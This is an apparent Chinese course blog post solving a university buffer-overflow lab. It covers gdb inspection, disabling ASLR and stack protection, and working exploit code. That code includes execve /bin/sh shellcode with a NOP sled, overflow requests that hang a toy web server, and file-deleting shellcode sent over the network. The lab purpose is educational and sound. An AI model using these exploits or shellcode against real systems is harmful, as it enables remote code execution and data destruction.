---
layout: post
title: 信息安全（缓冲区溢出攻击解答）
category: security
modified: 2015-11-03
tags: [security,buffer overflow,ustc]
comments: true
pinned: true
excerpt: "Exercise 1：根据如下代码，打印出buffer数组的地址，其中注释部分便是加入的代码，编译并运行程序三次，结果如下图所示，可以看到三次分配给func函数里buffer数组的地址各不相同。..."
---
#Exercise 1：
　　添加printf代码即可，注意地址需要用%p，编译并运行程序三次，可以得出三次地址各不相同。

```
void badman()
{
    printf("I am the bad man\n");
    return;
}
int func(char *str)
{
  int variable_a;
  char buffer[12];
  printf("%p\n",buffer);
  strcpy(buffer, str);
  
  return 1;
}
int main(int argc, char **argv)
{
  char *buf = "hello\n";
  
  if(argc > 1){
    buf = argv[1];
  }

  func(buf);
  printf("Returned Properly\n");
  return 1;
}
```

使用如下命令输出结果


```
./stack1 >> address.txt
./stack1 >> address.txt
./stack1 >> address.txt
查看结果
cat address.txt
```

#Exercise2:

　　基本的gdb调试指令：
　　b设置断点，这里在func入口处设置断点，
　　r开始运行，可以看到程序会在func入口处停止运行；
　　info r用于显示各寄存器的值　　
　　i r $ebp或者p $esp显示寄存器ebp的值，即当前函数值的栈底指针；
　　x/…  addr指令用于取addr所存的值，可以指定输出形式，如x/4wx是以x（hex）形式从指定地址往后打印4个w（4字节一组），还有诸如x/bx,x/10i,x/2s等格式；
　　disassemble func显示func函数对应的汇编指令以及指令在内存中的地址；
　　可以用p打印变量信息，如p badman打印badman函数的入口地址；
　　set命令可以设置变量，地址等的值。
![](http://i.imgur.com/WLihYks.png)
![](http://i.imgur.com/u8mamUh.png)
#Exercise3:

　　关闭ASLR，即地址空间随机化机制：

　　在终端运行`sudo sysctl -w kernel.randomize_va_space=0`,将其设为0即可(或者`sudo -i`进入root权限下`echo 0 >/proc/sys/kernel/randomize_va_space`)，查看是否成功`cat /proc/sys/kernel/randomize_va_space`然后我们再运行三次stack1.c，如下图所示，可以看到buffer的地址是相同的。
![](http://i.imgur.com/8nnpcph.png)
#　Exercise4:

　　我们需要关闭栈保护机制，否则系统禁止我们访问，关闭保护：

　　`gcc -g -z execstack -fno-stack-protector -o stack1 stack1.c`

　　在stack1.c中设置了两个断点，分别在主函数调用func函数的地方和func函数入口处。通过如图一步步的调试，打印出func函数入口地址、主函数调用处地址、eip、esp、buffer等，我们可以看出eip是每次程序执行的下次地址，一直在变，esp是栈顶值，在调用func函数之前或者之后都是某个定值，但是由于我们在传入的字符串的个数很多，strcpy函数在复制给buffer的时候把地址0xbffff220的esp给覆盖了，而我传入的字符串从图中可以看出是”hello”其中’o’重复了51,所以最后打印出地址0xbffff220的值是0x6f6f6f6f，6f是’o’的ascii码值,导致程序在结束func函数时无法正常返回主函数。
![](http://i.imgur.com/52LB4q4.png)
![](http://i.imgur.com/HHIYJy1.png)
#Exercise5:
　　实验过程如图所示，地址0xffffd82c存储的是main函数的入口地址值，当改成0x0804842b之后，这个值是函数badman的入口值，所以得到了执行，但是由于本当执行主函数的改成执行了未知的函数，所以出现了段错误，只需要在修改之后再加上set *0x8048414=0x8048571，地址值可行就不会出现错误。
![](http://i.imgur.com/oNRtKuK.png)
![](http://i.imgur.com/AQ2GNAj.png)
#Exercise6:
　　实验过程如图所示，取得了控制权。

```
gcc -g -z execstack -fno-stack-protector -o stack2 stack2.c
代码：
char shellcode[]=
  "\x31\xc0" 
  "\x50" 
  "\x68""//sh" 
  "\x68""/bin" 
  "\x89\xe3" 
  "\x50" 
  "\x53" 
  "\x89\xe1" 
  "\x99"
  "\xb0\x0b" 
  "\xcd\x80" ;
// size = 24

int func(char *str)
{
  char buffer[128];
  /* fill code in here:
   */

  strcpy(buffer, str);
  
  return 1;
}

int main(int argc, char**argv)
{
  char buffer[1024];

  /* Construct an attack shellcode to pop a shell.
   * You should put your shellcode into the "buffer" array, and
   * pass the "buffer" to the function "func".
   * Your code here:
   */  
  int addr = (int)(buffer-140);/
  int *ptr = (int*)buffer;
  int i;

  for(i=0;i<1024;i+=4){
    *ptr = addr;
    ptr++;
  }

  char *nop_ptr = buffer;
  for(i=0;i<128/2;++i)
    *(nop_ptr++) = 0x90;

  nop_ptr = buffer+(128/2-strlen(shellcode)/2);
  for(i=0;i<strlen(shellcode);++i)
    *(nop_ptr++) = shellcode[i];

  func(buffer);
  printf("Returned Properly\n");
  return 1;
}
```

![](http://i.imgur.com/Zvkqq1m.png)
#Exercise7:
　　找到两个漏洞，主要在以下代码中：
　　getToken函数对' '和'\r\n'以外字符直接进行存储，并且都不经过数组边界检查，所以s数组是很容易溢出的，而且当遇到'\r'时，如果后面没有'\n'，输入的字符也会被一概存入s；
　　s数组溢出之后不仅可以修改return address从而改变程序执行流，而且可以修改参数fd，比如我们可以将其改为0，那么当getToken再调用getChar时，read函数会去标准输入读取字符，这样就可以使客户端浏览器处于”死等“状态。
#Exercise8:
　　对于以上找到的漏洞，在browser.c中添加请求字符串，达到crash sever的目的，效果是客户端一直处于等待response的状态。
　　攻击的关键在于找到返回地址所在的地址，我们可以用gdb调试的方法找到这个地址，也可以在parse.c中输出s和fd的地址，那么ret就在&fd这个地址，这里之所以还要找到s的地址是因为，返回地址的下一个字存放的是fd，我们如果改变了fd，那么调用getChar时，read函数不再是去客户端socket读取值，而是根据文件描述符fd去其它文件读了。

　　编写一个无限循环的shellcode，如
　　while(1);

　　编译后用objdump可以查看其机器码，我们可以看到是eb fe,我们将NOP,shellcode，addr分别填入大小为&fd-s的数组，

　　还有一个关键处是我们还要在数组最后加一个' ',这是getToken函数的出口之一，另一个是'\r\n'.

　　将shellcode代码存入缓冲区，在最后一个字节填入' ',具体的代码如下：

```
char req[1065];
  int i;
  for(i=0;i<1064;++i)
    req[i] = 0;
  for(i=0;i<strlen(shellcode);++i)
    req[i] = shellcode[i];
  *((int*)(req+1060)) = 0xbffff9e8;//该地址为getToken的s数组地址
  req[1064] = ' ';
  write(sock_client,req,1065);
```

　2.根据找到的另一漏洞，我们可以不用shellcode，达到同样的效果，就是将fd的内容改为0，让read函数等待标准输入，代码如下：

```
char req[1069];
  int i;
  for(i=0;i<1068;++i)
    req[i] = 0;
  req[1068] = ' ';
  write(sock_client,req,1069);
```

![](http://i.imgur.com/CopUe1T.png)
#Exercise9:

　　先研究了create-shell.c文件中汇编指令之如何实现删除一个文件的，后来发现只需要把文件路径转化成十六进制的ascii码值，然后压栈，就可以完成删除工作，那么写了个小程序ascii.c把自己想要删除的文件路径转化成十六进制数据，然后写入create-shell.c文件中然后生成了shellcode，在放入test-shell.c文件中测试，发现成功啦！然后在写入shellcode进行攻击，终于攻击服务器成功了。

```
ascii.c代码：
int main()
{
    char s[] = "0/home/seed/security/lab1-code/grades.txt";
    int i = 40;
    for(;i>-1;i--)
    {
       if(!(i%4))
          printf("\n");
       printf("%x",s[i]);
    }
    return 0;
}
create_shellcode.c代码：
__asm__(".globl mystart\n" 
	  "mystart:\n"
	  
	  "xor    %eax,%eax\n"
	  "push   %eax\n"    
	  "push   $0x7478742e\n"    
	  "push   $0x73656461\n"    
	  "push   $0x72672f65\n"    
	  "push   $0x646f632d\n"    
	  "push   $0x3162616c\n"    
	  "push   $0x2f797469\n"    
	  "push   $0x72756365\n"    
	  "push   $0x732f6465\n"    
	  "push   $0x65732f65\n"    
	  "push   $0x6d6f682f\n"    
	  "mov    %esp,%ebx\n"      
	  "mov    $0xa,%al\n"
	  "int    $0x80\n"
	  "xor	%ebx,%ebx\n"
	  "mov    $0x1,%al\n"
	  "int    $0x80\n"
	  ".globl end\n"
	  "end:\n"
	  "leave\n"
	  "ret\n"
	  );
创建你的文件文件，运行./broswer程序之后，可以发现文件被成功删除。  
char req[1065];
  long *ptr,*addr_ptr;
  addr_ptr = (long*)0xbffff9f8;
  int i;
  ptr = (long*)req;
  for(i=0;i<1064;i+=4)
    *(ptr++) = addr_ptr;

  for(i=0;i<1024/2;++i) 
    req[i] = 0x90;

  char *pptr = req+1024/2-strlen(shellcode)/2;
  for(i=0;i<strlen(shellcode);++i)
    *(pptr++) = shellcode[i];
  req[1064] = ' ';
  write(sock_client,req,1065);
```

![](http://i.imgur.com/5s5cQa2.png)
![](http://i.imgur.com/RwBFq2M.png)
#Exercise10:
　　s数组写入时检查i的大小是否小于1024，如果小于1024，则可以写入，否则不予写入。
